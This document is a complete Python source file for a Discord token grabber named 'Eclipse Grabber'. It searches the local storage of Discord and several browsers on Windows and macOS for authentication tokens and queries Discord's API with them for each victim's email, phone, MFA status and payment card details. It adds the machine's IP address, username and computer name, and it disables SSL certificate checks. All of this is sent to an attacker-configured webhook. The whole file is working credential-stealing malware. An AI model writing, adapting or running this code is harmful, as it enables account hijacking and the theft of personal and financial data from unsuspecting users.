import os
import ssl
from getpass import getuser
from json import dumps, loads
from platform import node as get_pc_name
from re import findall
from sys import platform as OS
from typing import List, Optional
from urllib.request import Request, urlopen

WEBHOOK = "{WEBHOOK}"

ssl._create_default_https_context = ssl._create_unverified_context


def pc_info():
    IPIFY_API_URL = "https://api.ipify.org?format=json"
    api_resp = open_url(IPIFY_API_URL)
    info = (
        f'IP: {api_resp.get("ip") if api_resp else None}\n'
        f"Username: {getuser()}\n"
        f"PC Name: {get_pc_name()}\n"
    )
    return info


def get_paths() -> dict:
    if OS == "win32":  # Windows
        local_app_data = os.getenv("LOCALAPPDATA")
        app_data = os.getenv("APPDATA")
        chromium_path = ["User Data", "Default"]

    if OS == "darwin":  # OSX
        local_app_data = os.path.expanduser("~/Library/Application Support")
        app_data = os.path.expanduser("~/Library/Application Support")
        chromium_path = ["Default"]

    paths = {
        "Discord": [app_data, "Discord"],
        "Discord Canary": [app_data, "discordcanary"],
        "Discord PTB": [app_data, "discordptb"],
        "Google Chrome": [local_app_data, "Google", "Chrome", *chromium_path],
        "Brave": [local_app_data, "BraveSoftware", "Brave-Browser", *chromium_path],
        "Yandex": [local_app_data, "Yandex", "YandexBrowser", *chromium_path],
        "Opera": [app_data, "Opera Software", "Opera Stable"],
    }
    for app_name, path in paths.items():
        paths[app_name] = os.path.join(*path)

    return paths


def open_url(url: str,
             token: Optional[str] = None,
             data: Optional[bytes] = None) -> Optional[dict]:
    headers = {
        "Content-Type": "application/json",
        "User-Agent": (
            "Mozilla/5.0 (X11; Linux x86_64) "
            "AppleWebKit/537.11 (KHTML, like Gecko) "
            "Chrome/23.0.1271.64 Safari/537.11"
        ),
    }
    if token:
        headers.update({"Authorization": token})
    try:
        result = urlopen(Request(url, data, headers)).read().decode().strip()
        if result:
            return loads(result)
    except Exception:
        pass


class Account:
    DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
    DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
    DISCORD_BILLING_URL = DISCORD_API_URL + "/billing/payment-sources"

    def __init__(self, token: str, token_location: str):
        self.token = token
        self.token_location = token_location
        self.account_data = open_url(self.DISCORD_API_URL, self.token)
        self.billing_data = open_url(self.DISCORD_BILLING_URL, self.token)
        if self.account_data:
            self.name = self.account_data.get("username")
            self.discriminator = self.account_data.get("discriminator")
            self.id = self.account_data.get("id")
            self.avatar_url = self.DISCORD_AVATAR_URL.format(
                id=self.id, avatar_id=self.account_data.get('avatar')
            )

    def account_info(self) -> str:
        if not self.account_data:
            return "None"
        info = (
            f"Email: {str(self.account_data.get('email'))}\n"
            f"Phone: {str(self.account_data.get('phone'))}\n"
            f"Nitro: {'Enabled' if bool(self.account_data.get('premium_type')) else 'Disabled'}\n"
            f"MFA: {'Enabled' if bool(self.account_data.get('mfa_enabled')) else 'Disabled'}\n"
            f"Lang: {str(self.account_data.get('locale')).capitalize()}"
        )
        return info

    def billing_info(self) -> List[str]:
        if not self.billing_data:
            return "None"
        info = []
        for bill in self.billing_data:
            info.append(
                f"Id: {str(bill.get('id'))}\n"
                f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
                f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
                f"Invalid: {str(bill.get('invalid'))}\n"
                f"Brand: {str(bill.get('brand')).capitalize()}\n"
                f"Last digits: {str(bill.get('last_4'))}\n"
                f"Expires: {str(bill.get('expires_month'))}"
                f"/{str(bill.get('expires_year'))}\n"
                f"Country: {str(bill.get('country'))}"
            )
        return info


def field(title: str, text: str, inline: bool = True) -> str:
    return {"name": f"**{title} Info**", "value": str(text), "inline": bool(inline)}


def embed_info(accounts: List[Account]) -> List[dict]:
    embeds = []
    for account in accounts.values():
        fields = [
            field("Account", account.account_info()),
            field("PC", pc_info()),
            field("Token", account.token, False)
        ]
        if account.billing_data:
            fields.insert(-1, field("Billing", account.billing_info()[0]))

        embed = {
            "color": 0x6A5ACD,
            "fields": fields,
            "footer": {"text": "Made by @3ct0s and @JM1k1"},
            "author": {
                "name": (
                    f"{account.name}#"
                    f"{account.discriminator} "
                    f"({account.id})"
                ),
                "icon_url": account.avatar_url
            }
        }
        embeds.append(embed)
    return embeds


def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Eclipse Grabber",
        "avatar_url": "https://imgur.com/Ymo8GEe.png",
    }
    data = dumps(webhook).encode()
    return open_url(WEBHOOK_URL, None, data)


def get_tokens(path: str) -> List[str]:
    tokens = []
    for file_name in os.listdir(path):
        if file_name.endswith(".log") or file_name.endswith(".ldb"):
            content = open(os.path.join(path, file_name), errors="ignore")
            for line in map(str.strip, content.readlines()):
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
    return tokens


def get_accounts(paths: dict) -> dict:
    accounts = {}
    for app_name, path in paths.items():
        path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(path):
            continue
        for token in get_tokens(path):
            account = Account(token, app_name)
            if account.account_data and account.id not in accounts.keys():
                accounts.update({account.id: account})
    return accounts


def main(WEBHOOK_URL: str):
    paths = get_paths()
    accounts = get_accounts(paths)
    embeds = embed_info(accounts)
    send_webhook(embeds, WEBHOOK_URL)


if __name__ == "__main__":
    main(WEBHOOK)
